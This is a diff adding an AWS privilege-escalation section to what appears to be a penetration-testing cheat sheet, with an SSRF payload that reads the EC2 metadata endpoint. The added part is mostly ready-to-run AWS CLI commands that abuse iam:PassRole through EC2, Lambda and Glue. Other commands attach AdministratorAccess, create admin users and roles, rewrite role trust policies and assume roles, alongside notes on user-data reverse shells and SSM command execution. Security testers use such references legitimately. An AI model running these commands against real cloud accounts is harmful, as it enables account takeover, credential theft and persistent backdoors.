@@ -601,7 +601,7 @@ Hit the `meta-data` endpoint on `169.254.169.254`.
 ?url=http://169.254.169.254/latest/meta-data/
 ```
 
-To test:
+##### Attack Vectors
 
 - iam/
 - instance-id
@@ -636,6 +636,117 @@ aws_session_token = <TOKEN>
 
 ```console
 $ aws sts get-caller-identity --profile <PROFILE>
+```
+
+### Privilege Escalation
+
+#### Core Concepts
+
+- `iam:PassRole`: Lets you pass an IAM Role to a service (e.g., EC2, Lambda).
+- `iam:Create*`, `iam:Put*`, `iam:UpdateAssumeRolePolicy`: Can lead to full compromise.
+- `Abusable Services`: EC2, Lambda, CloudFormation, Glue, SageMaker, DataPipeline.
+
+#### iam:PassRole and Service Abuse
+
+##### Prerequisites
+
+- Pass a high-privilege role
+- Start a service that uses it
+
+##### EC2 Instances
+
+```console
+$ aws ec2 run-instances --image-id <ID> --iam-instance-profile Name=<ROLE>
+```
+
+##### Lambda Functions
+
+```console
+$ aws lambda create-function --function-name backdoor --role <ROLE>
+```
+
+##### Glue
+
+```console
+$ aws glue create-dev-endpoint --role-arn <ROLE> --endpoint-name <NAME>
+```
+
+#### Modify or Attach Inline Policies
+
+##### Update Custom Policy and add Permissions
+
+```console
+$ aws iam put-user-policy --user-name <USERNAME> --policy-name escalator --policy-document file://full-admin.json
+```
+
+##### Attach a managed Admin Policy
+
+```console
+$ aws iam attach-user-policy --user-name <USERNAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+#### Create a new Admin Role or User
+
+##### Create a new User
+
+```console
+$ aws iam create-user --user-name <USERNAME>
+$ aws iam attach-user-policy --user-name <USERNAME> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+##### Create a new Role with a Trust Policy
+
+```console
+$ aws iam create-role --role-name <ROLE> --assume-role-policy-document file://trust.json
+$ aws iam attach-role-policy --role-name <ROLE> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+```
+
+#### Update Trust Policies for Existing Roles
+
+##### Abuse iam:UpdateAssumeRolePolicy to assume an Admin Role
+
+```console
+$ aws iam update-assume-role-policy --role-name <ROLE> --policy-document file://evil-trust.json
+```
+
+#### Assume a Role
+
+##### Prerequisites
+
+- User need to be trusted by the role (Trust Policy).
+
+##### Execution
+
+```console
+$ aws sts assume-role --role-arn <ROLE> --role-session-name <SESSION>
+```
+
+#### Use Services to Execute Code
+
+##### Prerequisites
+
+- Able to launch a service and inject a script
+   - Lambda: Create Backdoor with high-privilege role assigned to it
+   - Glue: Launch with a shell script
+   - EC2 Instance: Start instance with user-data reverse shell
+   - SSM: Run commands on existing EC2 Instances
+
+#### Identity Access Management (IAM) Actions
+
+##### Prerequisites
+
+```console
+iam:PassRole
+iam:AttachUserPolicy
+iam:PutUserPolicy
+iam:UpdateAssumeRolePolicy
+iam:CreatePolicy
+iam:CreateUser
+iam:CreateRole
+lambda:CreateFunction
+ec2:RunInstances
+glue:CreateDevEndpoint
+ssm:SendCommand
 ```
 
 ## Entra
